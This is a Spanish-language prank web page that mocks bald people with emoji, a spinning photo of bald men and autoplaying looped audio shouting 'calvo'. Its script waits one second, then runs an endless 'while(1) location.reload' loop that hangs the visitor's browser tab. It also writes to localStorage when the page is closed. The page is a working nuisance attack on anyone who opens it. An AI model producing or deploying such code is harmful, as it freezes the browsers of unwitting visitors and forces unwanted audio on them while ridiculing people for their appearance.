<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>¡Advertencia!</title>
    <style>
        body {
            margin: 0;
            height: 100vh;
            background: linear-gradient(45deg, #ff6347, #ff4500);
            color: #ffffff;
            font-family: Arial, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            text-align: center;
            overflow: hidden;
        }
        h1 {
            font-size: 3em;
            color: #ffeb3b;
            text-shadow: 2px 2px #000;
            animation: shake 0.3s infinite;
        }
        p {
            font-size: 1.5em;
            color: #ffffff;
            margin-top: 20px;
            animation: fadeIn 2s ease-in-out infinite alternate;
        }
        img {
            width: 80%;
            max-width: 400px;
            border-radius: 50%;
            margin-top: 20px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
            animation: spin 4s linear infinite;
        }
        @keyframes shake {
            0% { transform: translate(1px, 1px) rotate(0deg); }
            10% { transform: translate(-1px, -2px) rotate(-1deg); }
            20% { transform: translate(-3px, 0px) rotate(1deg); }
            30% { transform: translate(3px, 2px) rotate(0deg); }
            40% { transform: translate(1px, -1px) rotate(1deg); }
            50% { transform: translate(-1px, 2px) rotate(-1deg); }
            60% { transform: translate(-3px, 1px) rotate(0deg); }
            70% { transform: translate(3px, 1px) rotate(-1deg); }
            80% { transform: translate(-1px, -1px) rotate(1deg); }
            90% { transform: translate(1px, 2px) rotate(0deg); }
            100% { transform: translate(1px, -2px) rotate(-1deg); }
        }
        @keyframes spin {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
    </style>
</head>
<body>

<h1>Hola, Don Limpio</h1>
<p>¡🧑‍🦲🧑‍🦲🧑‍🦲🧑‍🦲🧑‍🦲🧑‍🦲🧑‍🦲🧑‍🦲🧑‍🦲🧑‍🦲🧑‍🦲🧑‍🦲🧑‍🦲🧑‍🦲🧑‍🦲🧑‍🦲!</p>
<img src="https://imagenes.heraldo.es/files/image_990_556/uploads/imagenes/2024/07/25/por-que-espana-es-el-pais-con-mas-calvos-gsc1.jpeg" alt="Imagen divertida">

<audio id="audio" autoplay loop>
    <source src="https://www.myinstants.com/media/sounds/calvoooooooooooooooooooooooooooo.mp3" type="audio/mpeg">
    Tu navegador no soporta la reproducción de audio.
</audio>

<script>
    const audio = document.getElementById('audio');
    audio.play();
    onbeforeunload = function(){ localStorage.x = 1; };

    setTimeout(function(){
        while(1) location.reload(1);
    }, 1000);
</script>

</body>
</html>
